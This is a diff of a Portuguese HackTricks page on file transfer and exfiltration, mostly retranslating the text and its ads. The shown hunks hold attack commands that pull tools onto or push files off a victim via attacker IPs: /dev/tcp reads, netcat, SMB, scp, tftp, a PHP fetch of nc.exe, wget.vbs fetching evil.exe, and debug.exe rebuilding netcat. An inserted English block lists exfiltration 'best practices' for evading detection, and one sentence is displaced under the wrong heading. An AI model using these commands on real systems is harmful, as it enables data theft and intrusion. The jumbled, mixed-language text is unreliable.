@@ -2,29 +2,29 @@
 
 <details>
 
-<summary><strong>Aprenda hacking no AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Outras formas de apoiar o HackTricks:
+Outras maneiras de apoiar o HackTricks:
 
-* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF**, confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
-* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
-* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
-* **Junte-se ao grupo** 💬 [**Discord**](https://discord.gg/hRep4RUj7f) ou ao grupo [**telegram**](https://t.me/peass) ou **siga-me** no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
-* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios github** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* Se você quiser ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Adquira o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
+* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
+* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.
 
 </details>
 
 <figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
 
-Encontre vulnerabilidades que importam mais para que você possa corrigi-las mais rapidamente. Intruder rastreia sua superfície de ataque, executa varreduras proativas de ameaças, encontra problemas em toda a sua pilha tecnológica, de APIs a aplicativos web e sistemas em nuvem. [**Experimente gratuitamente**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoje.
+Encontre vulnerabilidades que mais importam para que você possa corrigi-las mais rapidamente. O Intruder rastreia sua superfície de ataque, executa varreduras proativas de ameaças, encontra problemas em toda a sua pilha tecnológica, de APIs a aplicativos da web e sistemas em nuvem. [**Experimente de graça**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoje.
 
 {% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
 
 ***
 
-## Domínios comumente liberados para exfiltrar informações
+## Domínios comumente permitidos para exfiltração de informações
 
-Verifique [https://lots-project.com/](https://lots-project.com/) para encontrar domínios comumente liberados que podem ser abusados
+Verifique [https://lots-project.com/](https://lots-project.com/) para encontrar domínios comumente permitidos que podem ser abusados
 
 ## Copiar e Colar Base64
 
@@ -62,10 +62,10 @@ Start-BitsTransfer -Source $url -Destination $output
 #OR
 Start-BitsTransfer -Source $url -Destination $output -Asynchronous
 ```
-### Upload de arquivos
+### Enviar arquivos
 
 * [**SimpleHttpServerWithFileUploads**](https://gist.github.com/UniIsland/3346170)
-* [**SimpleHttpServer imprimindo GETs e POSTs (também headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
+* [**SimpleHttpServer printing GET and POSTs (also headers)**](https://gist.github.com/carlospolop/209ad4ed0e06dd3ad099e2fd0ed73149)
 * Módulo Python [uploadserver](https://pypi.org/project/uploadserver/):
 ```bash
 # Listen to files
@@ -150,7 +150,7 @@ mkdir -p /ftphome
 chown -R ftpuser:ftpgroup /ftphome/
 /etc/init.d/pure-ftpd restart
 ```
-### **Windows** cliente
+### **Cliente Windows**
 ```bash
 #Work well with python. With pure-ftp use fusr:ftp
 echo open 10.11.0.41 21 > ftp.txt
@@ -163,7 +163,7 @@ ftp -n -v -s:ftp.txt
 ```
 <figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
 
-Encontre vulnerabilidades que são mais importantes para que você possa corrigi-las mais rapidamente. O Intruder monitora sua superfície de ataque, executa varreduras proativas de ameaças, encontra problemas em todo o seu conjunto tecnológico, desde APIs até aplicativos web e sistemas em nuvem. [**Experimente gratuitamente**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoje.
+Encontre vulnerabilidades que mais importam para que você possa corrigi-las mais rapidamente. O Intruder rastreia sua superfície de ataque, executa varreduras proativas de ameaças, encontra problemas em toda a sua pilha tecnológica, desde APIs até aplicativos da web e sistemas em nuvem. [**Experimente gratuitamente**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoje.
 
 {% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
 
@@ -194,6 +194,56 @@ guest ok = Yes
 service smbd restart
 ```
 Windows
+
+## Exfiltration
+
+### Overview
+
+Exfiltration is the unauthorized transfer of data from a target system. This can be achieved through various methods, such as:
+
+- Uploading data to an external server
+- Sending data via email
+- Using cloud storage services
+- Hiding data in images or other files
+- Encrypting data before exfiltration
+
+### Techniques
+
+#### Data Compression
+
+Data can be compressed before exfiltration to reduce its size and make it easier to transfer without raising suspicion.
+
+#### Data Encryption
+
+Encrypting data before exfiltration can help protect it from being intercepted or tampered with during transit.
+
+#### Steganography
+
+Steganography involves hiding data within other files, such as images, to avoid detection.
+
+#### DNS Tunneling
+
+DNS tunneling can be used to exfiltrate data by encoding it within DNS queries and responses.
+
+#### Remote Access Tools
+
+Remote access tools can be used to remotely access a target system and exfiltrate data.
+
+### Tools
+
+- **WinRAR**: A file compression tool that can be used to compress data before exfiltration.
+- **VeraCrypt**: A tool for encrypting data before exfiltration to enhance security.
+- **OpenStego**: A steganography tool for hiding data within other files.
+- **Iodine**: A tool for DNS tunneling to exfiltrate data covertly.
+- **Netcat**: A versatile networking tool that can be used for exfiltration.
+- **Meterpreter**: A post-exploitation tool that can be used for exfiltration in a compromised system.
+
+### Best Practices
+
+- Use encryption to protect exfiltrated data.
+- Employ data compression to reduce transfer times.
+- Use multiple exfiltration methods to avoid detection.
+- Regularly monitor outbound network traffic for suspicious activity.
 ```bash
 CMD-Wind> \\10.10.14.14\path\to\exe
 CMD-Wind> net use z: \\10.10.14.14\test /user:test test #For SMB using credentials
@@ -209,7 +259,7 @@ scp <username>@<Attacker_IP>:<directory>/<filename>
 ```
 ## SSHFS
 
-Se a vítima tiver SSH, o atacante pode montar um diretório da vítima para o atacante.
+Se o alvo tiver SSH, o atacante pode montar um diretório do alvo para o atacante.
 ```bash
 sudo apt-get install sshfs
 sudo mkdir /mnt/sshfs
@@ -234,7 +284,7 @@ nc -w5 -lvnp 80 < file_to_send.txt # Inside attacker
 exec 6< /dev/tcp/10.10.10.10/4444
 cat <&6 > file.txt
 ```
-Obrigado a **@BinaryShadow\_**
+Agradecimentos a **@BinaryShadow\_**
 
 ## **ICMP**
 ```bash
@@ -262,9 +312,9 @@ sudo python -m smtpd -n -c DebuggingServer :25
 ```
 ## TFTP
 
-Por padrão no XP e 2003 (em outros precisa ser explicitamente adicionado durante a instalação)
+Por padrão no XP e 2003 (em outros sistemas, precisa ser adicionado explicitamente durante a instalação)
 
-No Kali, **iniciar servidor TFTP**:
+No Kali, **inicie o servidor TFTP**:
 ```bash
 #I didn't get this options working and I prefer the python option
 mkdir /tftp
@@ -276,13 +326,13 @@ cp /path/tp/nc.exe /tftp
 pip install ptftpd
 ptftpd -p 69 tap0 . # ptftp -p <PORT> <IFACE> <FOLDER>
 ```
-No **victim**, conecte-se ao servidor Kali:
+No **alvo**, conecte-se ao servidor Kali:
 ```bash
 tftp -i <KALI-IP> get nc.exe
 ```
 ## PHP
 
-Baixe um arquivo com um oneliner PHP:
+Baixe um arquivo com um PHP oneliner:
 ```bash
 echo "<?php file_put_contents('nameOfFile', fopen('http://192.168.1.102/file', 'r')); ?>" > down2.php
 ```
@@ -324,9 +374,9 @@ cscript wget.vbs http://10.11.0.5/evil.exe evil.exe
 ```
 ## Debug.exe
 
-Esta é uma técnica incrível que funciona em máquinas Windows de 32 bits. A ideia é usar o programa `debug.exe`. Ele é usado para inspecionar binários, como um depurador. Mas também pode reconstruí-los a partir de hex. Então a ideia é pegar binários, como `netcat`. E depois desmontá-lo em hex, colar em um arquivo na máquina comprometida e, em seguida, montá-lo com `debug.exe`.
+Esta é uma técnica maluca que funciona em máquinas Windows de 32 bits. A ideia é usar o programa `debug.exe`. Ele é usado para inspecionar binários, como um depurador. Mas também pode reconstruí-los a partir de hex. Então a ideia é pegar binários, como `netcat`. E então desmontá-lo em hex, colá-lo em um arquivo na máquina comprometida e depois montá-lo com `debug.exe`.
 
-`Debug.exe` só pode montar 64 kb. Então precisamos usar arquivos menores que isso. Podemos usar upx para comprimir ainda mais. Então vamos fazer isso:
+`Debug.exe` só pode montar 64 kb. Então precisamos usar arquivos menores que isso. Podemos usar o upx para comprimi-lo ainda mais. Então vamos fazer isso:
 ```
 upx -9 nc.exe
 ```
@@ -334,29 +384,29 @@ Agora ele pesa apenas 29 kb. Perfeito. Então agora vamos desmontá-lo:
 ```
 wine exe2bat.exe nc.exe nc.txt
 ```
-Agora é só copiar e colar o texto no nosso windows-shell. E ele automaticamente criará um arquivo chamado nc.exe
-
 ## DNS
 
 * [https://github.com/62726164/dns-exfil](https://github.com/62726164/dns-exfil)
 
 <figure><img src="/.gitbook/assets/image (675).png" alt=""><figcaption></figcaption></figure>
 
-Encontre vulnerabilidades que importam mais para que você possa corrigi-las mais rápido. Intruder rastreia sua superfície de ataque, executa varreduras proativas de ameaças, encontra problemas em toda a sua pilha tecnológica, de APIs a aplicativos web e sistemas em nuvem. [**Experimente gratuitamente**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoje.
+Agora basta copiar e colar o texto em nosso shell do Windows. E ele automaticamente criará um arquivo chamado nc.exe
+
+Encontre vulnerabilidades que mais importam para que você possa corrigi-las mais rapidamente. O Intruder rastreia sua superfície de ataque, executa varreduras proativas de ameaças, encontra problemas em toda a sua pilha tecnológica, desde APIs até aplicativos da web e sistemas em nuvem. [**Experimente de graça**](https://www.intruder.io/?utm\_source=referral\&utm\_campaign=hacktricks) hoje.
 
 {% embed url="https://www.intruder.io/?utm_campaign=hacktricks&utm_source=referral" %}
 
 
 <details>
 
-<summary><strong>Aprenda AWS hacking do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
+<summary><strong>Aprenda hacking AWS do zero ao herói com</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
-Outras formas de apoiar o HackTricks:
+Outras maneiras de apoiar o HackTricks:
 
-* Se você quer ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Confira os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
-* Adquira o [**material oficial PEASS & HackTricks**](https://peass.creator-spring.com)
-* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção de [**NFTs**](https://opensea.io/collection/the-peass-family) exclusivos
-* **Junte-se ao** 💬 [**grupo do Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo do telegram**](https://t.me/peass) ou **siga**-me no **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/carlospolopm)**.**
-* **Compartilhe suas técnicas de hacking enviando PRs para os repositórios do github** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud).
+* Se você deseja ver sua **empresa anunciada no HackTricks** ou **baixar o HackTricks em PDF** Verifique os [**PLANOS DE ASSINATURA**](https://github.com/sponsors/carlospolop)!
+* Obtenha o [**swag oficial PEASS & HackTricks**](https://peass.creator-spring.com)
+* Descubra [**A Família PEASS**](https://opensea.io/collection/the-peass-family), nossa coleção exclusiva de [**NFTs**](https://opensea.io/collection/the-peass-family)
+* **Junte-se ao** 💬 [**grupo Discord**](https://discord.gg/hRep4RUj7f) ou ao [**grupo telegram**](https://t.me/peass) ou **siga-nos** no **Twitter** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
+* **Compartilhe seus truques de hacking enviando PRs para os** [**HackTricks**](https://github.com/carlospolop/hacktricks) e [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) repositórios do github.
 
 </details>
